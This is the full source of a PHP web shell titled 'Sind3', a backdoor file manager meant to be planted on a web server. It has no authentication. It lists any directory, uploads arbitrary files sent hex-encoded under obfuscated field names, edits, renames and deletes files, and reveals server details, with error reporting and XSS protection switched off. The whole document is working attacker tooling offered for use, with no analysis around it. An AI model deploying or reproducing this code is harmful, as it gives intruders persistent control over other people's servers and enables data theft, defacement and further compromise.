<?php
session_start();header("X-XSS-Protection: 0");ob_start();set_time_limit(0);error_reporting(0);ini_set('display_errors', FALSE);
$isAjax = isset($_SERVER['HTTP_X_REQUESTED_WITH']) 
         && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest';

function hex($n) {
    $y='';
    for ($i=0; $i < strlen($n); $i++){
        $y .= dechex(ord($n[$i]));
    }
    return $y;
}
function uhex($y) {
    $n='';
    for ($i=0; $i < strlen($y)-1; $i+=2){
        $n .= chr(hexdec($y[$i].$y[$i+1]));
    }
    return $n;
}
if (isset($_GET["d"])) {
    $d = uhex($_GET["d"]);
    if (is_dir($d)) {
        chdir($d);
    } else {
        $d = getcwd();
    }
} else {
    $d = getcwd();
}
function setFlash($status, $msg) {
    $_SESSION['status'] = $status;
    $_SESSION['msg'] = $msg;
}
if (isset($_GET['ajax']) && $_GET['ajax'] == 1) {
    ?>
    <table>
        <thead>
            <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
        <?php
        $entries = scandir($d);
        $dirList = [];
        $fileList = [];
        foreach ($entries as $entry) {
            if ($entry == '.' || $entry == '..') continue;
            $path = $d . DIRECTORY_SEPARATOR . $entry;
            if (is_dir($path)) {
                $dirList[] = $entry;
            } else {
                $fileList[] = $entry;
            }
        }
        foreach ($dirList as $entry) {
            $path = $d . DIRECTORY_SEPARATOR . $entry;
            echo '<tr>';
            echo '<td><a class="ajaxDir" href="?d=' . hex($path) . '">' . htmlspecialchars($entry) . '</a></td>';
            echo '<td>-</td>';
            echo '<td></td>';
            echo '</tr>';
        }
        foreach ($fileList as $entry) {
            $path = $d . DIRECTORY_SEPARATOR . $entry;
            echo '<tr>';
            echo '<td>' . htmlspecialchars($entry) . '</td>';
            echo '<td>' . (is_file($path) ? filesize($path) . ' bytes' : '-') . '</td>';
            echo '<td>';
            echo '<a class="ajaxEdit" href="?action=edit&d=' . hex($d) . '&file=' . urlencode($entry) . '">Edit</a> | ';
            echo '<a class="ajaxRename" href="?action=rename&d=' . hex($d) . '&file=' . urlencode($entry) . '">Rename</a> | ';
            echo '<a class="ajaxDelete" href="?action=delete&d=' . hex($d) . '&file=' . urlencode($entry) . '">Delete</a>';
            echo '</td>';
            echo '</tr>';
        }
        ?>
        </tbody>
    </table>
    <?php
    exit;
}

if (isset($_GET['ajax']) && $_GET['ajax'] === 'breadcrumb') {
    $k = preg_split("/(\\\\|\/)/", $d);
    $breadcrumbHtml = '';
    foreach ($k as $m => $l) {
        if ($l == '' && $m == 0) {
            $breadcrumbHtml .= '<a class="ajx" href="?d=2f">/</a>';
        }
        if ($l == '') continue;
        $breadcrumbHtml .= '<a class="ajx" href="?d=';
        for ($i = 0; $i <= $m; $i++) {
            $breadcrumbHtml .= hex($k[$i]);
            if ($i != $m) $breadcrumbHtml .= '2f';
        }
        $breadcrumbHtml .= '">'.$l.'</a>/';
    }
    echo $breadcrumbHtml;
    exit;
}

function safe_stream_copy($in, $out): bool {
    if (PHP_VERSION_ID < 80009) {
        do {
            for (;;) {
                $buff = fread($in, 4096);
                if ($buff === false || $buff === '') {
                    break;
                }
                if (fwrite($out, $buff) === false) {
                    return false;
                }
            }
        } while (!feof($in));
        return true;
    } else {
        return stream_copy_to_stream($in, $out) !== false;
    }
}

if (isset($_POST['benkyo']) && isset($_POST['dakeja'])) {
    $fileName = $_POST['benkyo'];
    $encodedContent = $_POST['dakeja'];
    $decodedContent = hex2bin($encodedContent);

    if ($decodedContent === false) {
        if ($isAjax) {
            header('Content-Type: application/json');
            echo json_encode(['status' => 'failed', 'msg' => 'Invalid Base64 encoding']);
        } else {
            setFlash('failed', 'Invalid Base64 encoding');
            header("Location: ?d=" . hex($d));
        }
        exit;
    }

    $tempStream = fopen('php://temp', 'r+');
    fwrite($tempStream, $decodedContent);
    rewind($tempStream);

    $targetPath = $d . DIRECTORY_SEPARATOR . basename($fileName);
    $outStream = fopen($targetPath, 'wb');

    $success = $tempStream && $outStream && safe_stream_copy($tempStream, $outStream);

    if ($outStream) fclose($outStream);
    if ($tempStream) fclose($tempStream);

    if ($success) {
        if ($isAjax) {
            header('Content-Type: application/json');
            echo json_encode(['status' => 'success', 'msg' => 'File uploaded successfully']);
        } else {
            setFlash('success', 'File uploaded successfully');
            header("Location: ?d=" . hex($d));
        }
    } else {
        if ($isAjax) {
            header('Content-Type: application/json');
            echo json_encode(['status' => 'failed', 'msg' => 'File upload failed']);
        } else {
            setFlash('failed', 'File upload failed');
            header("Location: ?d=" . hex($d));
            exit;
        }
    }
    exit;
}
if (isset($_GET['action']) && in_array($_GET['action'], ['delete', 'rename', 'edit']) && isset($_GET['file'])) {
    if ($_GET['action'] === 'delete') {
        $fileName = $_GET['file'];
        $filePath = realpath($d . DIRECTORY_SEPARATOR . $fileName);
        if (!$filePath || !is_file($filePath)) {
            $response = ['status'=>'failed','msg'=>'File not found or access denied'];
        } else {
            $result = unlink($filePath);
            $response = $result 
                ? ['status'=>'success','msg'=>'File deleted successfully'] 
                : ['status'=>'failed','msg'=>'File deletion failed'];
        }
        header('Content-Type: application/json');
        echo json_encode($response);
        exit; 
    } elseif ($_GET['action'] === 'rename') {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_name'])) {
            $oldFile = realpath($d . DIRECTORY_SEPARATOR . $_GET['file']);
            $newFile = $d . DIRECTORY_SEPARATOR . $_POST['new_name'];
            if ($oldFile && is_file($oldFile)) {
                $result = rename($oldFile, $newFile);
                $response = $result 
                    ? ['status'=>'success','msg'=>'File renamed successfully'] 
                    : ['status'=>'failed','msg'=>'File renaming failed'];
                header('Content-Type: application/json');
                echo json_encode($response);
                exit;
            } else {
                header('Content-Type: application/json');
                echo json_encode(['status'=>'failed','msg'=>'File not found']);
                exit;
            }
        } elseif ($isAjax) {
            echo '<h2>Rename File: ' . htmlspecialchars($_GET['file']) . '</h2>';
            echo '<div class="terminal-box">';
            echo '<form class="ajaxForm" method="POST" action="?action=rename&d=' . hex($d) . '&file=' . urlencode($_GET['file']) . '">';
            echo '<input type="text" name="new_name" placeholder="New file name" required><br>';
            echo '<br><input type="submit" value="Rename"> ';
            echo '<button type="button" id="cancelAction">Cancel</button>';
            echo '</form>';
            echo '</div><hr>';
            exit;
        }
    } elseif ($_GET['action'] === 'edit') {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
            $filePath = realpath($d . DIRECTORY_SEPARATOR . $_GET['file']);
            if ($filePath && is_file($filePath)) {
                $fp = fopen($filePath, "w");
                if ($fp) {
                    $bytesWritten = fwrite($fp, stripslashes($_POST['content']));
                    fclose($fp);
                    $response = ($bytesWritten !== false)
                        ? ['status' => 'success', 'msg' => 'File edited successfully']
                        : ['status' => 'failed', 'msg' => 'File editing failed'];
                } else {
                    $response = ['status' => 'failed', 'msg' => 'File opening failed'];
                }
                header('Content-Type: application/json');
                echo json_encode($response);
                exit;
            } else {
                header('Content-Type: application/json');
                echo json_encode(['status' => 'failed', 'msg' => 'File not found']);
                exit;
            }        
        } elseif ($isAjax) {
            $filePath = realpath($d . DIRECTORY_SEPARATOR . $_GET['file']);
            if ($filePath && is_file($filePath)) {
                $content = file_get_contents($filePath);
                echo '<h2>Edit File: ' . htmlspecialchars($_GET['file']) . '</h2>';
                echo '<div class="terminal-box">';
                echo '<form class="ajaxForm" method="POST" action="?action=edit&d=' . hex($d) . '&file=' . urlencode($_GET['file']) . '">';
                echo '<textarea name="content" rows="10" cols="50" required>' . htmlspecialchars($content) . '</textarea><br>';
                echo '<br><input type="submit" value="Save"> ';
                echo '<button type="button" id="cancelAction">Cancel</button>';
                echo '</form>';
                echo '</div><hr>';
            }
            exit;
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Sind3</title>
    <!-- Load Ubuntu Mono from Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; }
        body {
            background-color: rgba(37, 37, 37, 0.8); /* Gray with slight transparency */
            color: #fff;
            font-family: 'Ubuntu Mono', monospace;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 60%;
            margin: 50px auto;
            padding: 20px;
            background-color: #222;
            border-radius: 8px;
        }
        .futer {
            width: 60%;
            margin: 50px auto;
            padding: 20px;
            background-color: #222;
            border-radius: 8px;
        }
        .breadcrumbs { margin-bottom: 15px; }
        a { color: #0f0; text-decoration: none; }
        a:hover { text-decoration: underline; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #555; padding: 8px; text-align: left; }
        th { background-color: #333; }
        input[type="text"], textarea {
            width: 100%;
            padding: 8px;
            margin: 0;
            border: 1px solid #333;
            border-radius: 4px;
            font-family: 'Ubuntu Mono', monospace;
        }
        input[type="submit"], button {
            border: 1px solid #fff;
            padding: 4px;
            background-color: #333;
            color: #fff;
            cursor: pointer;
            border-radius: 4px;
        }
        form { margin-bottom: 20px; }
        .terminal-box {
            background-color: #222;
            color: #0f0;
            padding: 15px;
            border: 1px solid #333;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        .terminal-box input[type="text"],
        .terminal-box textarea {
            background-color: #222;
            color: #0f0;
            border: 1px solid #333;
        }
        .notification {
            position: fixed;
            bottom: 20px;
            left: 20px;
            padding: 10px 20px;
            border-radius: 4px;
            font-family: 'Ubuntu Mono', monospace;
            font-size: 14px;
        }
        .success { background-color: #0a0; color: #fff; }
        .failed { background-color: #a00; color: #fff; }
        /* Custom file input button styling */
        #fileInput {
            display: none;
        }
        .custom-file-button {
            border: 1px solid #fff;
            padding: 4px;
            background-color: #333;
            color: #fff;
            cursor: pointer;
            border-radius: 4px;
            display: inline-block;
        }
    </style>
</head>
<body>
<div class="container">
    &thinsp;&thinsp;&thinsp;<b>SERV  :</b> <?= isset($_SERVER['SERVER_SOFTWARE']) ? php_uname() : "Server information not available"; ?><br>
    &thinsp;&thinsp;&thinsp;<b>SOFT  :</b> <?php echo $_SERVER['SERVER_SOFTWARE'];?><br>
    &thinsp;&thinsp;&thinsp;<b>IP  &nbsp;&nbsp;:</b> <?= gethostbyname($_SERVER['HTTP_HOST']) ?><br>
    <br><b>&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212&#8212</b>
    <br><br><form id="uploadForm" class="ajaxForm" method="POST">
        <label for="fileInput" class="custom-file-button" id="fileLabel">Choose File</label>
        <input type="file" id="fileInput" required>
        <input type="submit" value="Upload">
    </form>

    <br><div id="breadcrumbContainer">
    <?php
    $k = preg_split("/(\\\\|\/)/", $d);
    foreach ($k as $m => $l) {
        if ($l == '' && $m == 0) {
            echo '<a class="ajx" href="?d=2f">/</a>';
        }
        if ($l == '') continue;
        echo '<a class="ajx" href="?d=';
        for ($i = 0; $i <= $m; $i++) {
            echo hex($k[$i]);
            if ($i != $m) echo '2f';
        }
        echo '">'.$l.'</a>/';
    }
    ?>
</div><br>
<div id="actionContainer"></div><br>
    <div id="fileListContainer">
        <?php
        $entries = scandir($d);
        $dirList = [];
        $fileList = [];
        foreach ($entries as $entry) {
            if ($entry == '.' || $entry == '..') continue;
            $path = $d . DIRECTORY_SEPARATOR . $entry;
            if (is_dir($path)) {
                $dirList[] = $entry;
            } else {
                $fileList[] = $entry;
            }
        }
        ?>
        <table>
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
            <?php
            foreach ($dirList as $entry) {
                $path = $d . DIRECTORY_SEPARATOR . $entry;
                echo '<tr>';
                echo '<td><a class="ajaxDir" href="?d=' . hex($path) . '">' . htmlspecialchars($entry) . '</a></td>';
                echo '<td>-</td>';
                echo '<td></td>';
                echo '</tr>';
            }
            foreach ($fileList as $entry) {
                $path = $d . DIRECTORY_SEPARATOR . $entry;
                echo '<tr>';
                echo '<td>' . htmlspecialchars($entry) . '</td>';
                echo '<td>' . (is_file($path) ? filesize($path) . ' bytes' : '-') . '</td>';
                echo '<td>';
                echo '<a class="ajaxEdit" href="?action=edit&d=' . hex($d) . '&file=' . urlencode($entry) . '">Edit</a> | ';
                echo '<a class="ajaxRename" href="?action=rename&d=' . hex($d) . '&file=' . urlencode($entry) . '">Rename</a> | ';
                echo '<a class="ajaxDelete" href="?action=delete&d=' . hex($d) . '&file=' . urlencode($entry) . '">Delete</a>';
                echo '</td>';
                echo '</tr>';
            }
            ?>
            </tbody>
        </table>
    </div>
</div>

<div class="notification" id="notification" style="display:none;"></div>

<script>
// Show notification in the bottom left corner; auto-dismiss after 2 seconds.
function showNotification(status, msg) {
    var notif = document.getElementById('notification');
    notif.className = 'notification ' + status;
    notif.innerText = msg;
    notif.style.display = 'block';
    setTimeout(function(){ notif.style.display = 'none'; }, 2000);
}

function loadBreadcrumb() {
    var d = getQueryParam("d") || "<?php echo hex($d); ?>";
    fetch('?d=' + d + '&ajax=breadcrumb', { headers: { 'X-Requested-With': 'XMLHttpRequest' } })
    .then(response => response.text())
    .then(html => {
        document.getElementById('breadcrumbContainer').innerHTML = html;
    });
}

function getQueryParam(name) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
}

function loadFileList() {
    var d = getQueryParam("d") || "<?php echo hex($d); ?>";
    fetch('?d=' + d + '&ajax=1', { headers: { 'X-Requested-With': 'XMLHttpRequest' } })
    .then(response => response.text())
    .then(html => {
        document.getElementById('fileListContainer').innerHTML = html;
        attachAjaxEvents(); // reattach events after update
        resetFileInputLabel();
    });
}

function resetFileInputLabel() {
    var label = document.getElementById('fileLabel');
    if(label) {
        label.textContent = "Choose File";
    }
}

function attachAjaxEvents() {
    document.querySelectorAll('.ajaxDelete').forEach(function(link) {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            fetch(link.href, { headers: { 'X-Requested-With': 'XMLHttpRequest' } })
            .then(response => response.json())
            .then(data => {
                showNotification(data.status, data.msg);
                loadFileList();
                resetFileInput();
            });
        });
    });
    document.querySelectorAll('.ajaxEdit').forEach(function(link) {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            fetch(link.href, { headers: { 'X-Requested-With': 'XMLHttpRequest' } })
            .then(response => response.text())
            .then(html => {
                document.getElementById('actionContainer').innerHTML = html;
                attachAjaxForm();
                attachCancelEvent();
                resetFileInputLabel();
                resetFileInput();
            });
        });
    });
    document.querySelectorAll('.ajaxRename').forEach(function(link) {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            fetch(link.href, { headers: { 'X-Requested-With': 'XMLHttpRequest' } })
            .then(response => response.text())
            .then(html => {
                document.getElementById('actionContainer').innerHTML = html;
                attachAjaxForm();
                attachCancelEvent();
                resetFileInputLabel();
                resetFileInput();
            });
        });
    });
    document.querySelectorAll('.ajaxDir').forEach(function(link) {
    link.addEventListener('click', function(e) {
        e.preventDefault();
        window.history.pushState(null, '', link.href);
        loadFileList();  // Reload the file list
        loadBreadcrumb(); // Reload the breadcrumb
        resetFileInputLabel();
        resetFileInput();
    });
});
}

function attachAjaxForm() {
    document.querySelectorAll('.ajaxForm').forEach(function(form) {
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            var formData = new FormData(form);
            fetch(form.action, { method: 'POST', body: formData, headers: { 'X-Requested-With': 'XMLHttpRequest' } })
            .then(response => response.json())
            .then(data => {
                showNotification(data.status, data.msg);
                document.getElementById('actionContainer').innerHTML = '';
                loadFileList();
                resetFileInputLabel();
            });
        });
    });
}

function attachCancelEvent() {
    var cancelBtn = document.getElementById('cancelAction');
    if(cancelBtn) {
        cancelBtn.addEventListener('click', function() {
            document.getElementById('actionContainer').innerHTML = '';
            resetFileInputLabel();
        });
    }
}

function resetFileInput() {
    var fileInput = document.getElementById('fileInput');
    var fileLabel = document.getElementById('fileLabel');
    if (fileInput) {
        fileInput.value = ""; // Clear any selected file
    }
    if (fileLabel) {
        fileLabel.textContent = "Choose File"; // Reset label text
    }
}

document.addEventListener('DOMContentLoaded', function() {
    attachAjaxEvents();
    var fileInput = document.getElementById('fileInput');
    var uploadForm = document.getElementById('uploadForm');

    fileInput.addEventListener('change', function() {
        var label = document.getElementById('fileLabel');
        if(fileInput.files.length > 0) {
            label.textContent = fileInput.files[0].name;
        } else {
            label.textContent = "Choose File";
        }
    });

    if(uploadForm) {
        uploadForm.addEventListener('submit', function(e) {
            e.preventDefault();
            if(fileInput.files.length === 0) return;

            var file = fileInput.files[0];
            var reader = new FileReader();

            reader.onload = function(event) {
                var arrayBuffer = event.target.result;
                var bytes = new Uint8Array(arrayBuffer);
                var hexString = '';
                for (var i = 0; i < bytes.length; i++) {
                    hexString += bytes[i].toString(16).padStart(2, '0');
                }

                var formData = new FormData();
                formData.append("benkyo", file.name);
                formData.append("dakeja", hexString);

                fetch(uploadForm.action || window.location.href, {
                    method: 'POST',
                    body: formData,
                    headers: { 'X-Requested-With': 'XMLHttpRequest' }
                })
                .then(response => response.json())
                .then(data => {
                    showNotification(data.status, data.msg);
                    uploadForm.reset();
                    resetFileInputLabel();
                    loadFileList();
                });
            };

            reader.readAsArrayBuffer(file);
        });
    }
});
</script>
<footer class="futer">
				&copy; zeinhorobosu
			</footer>
</body>
</html>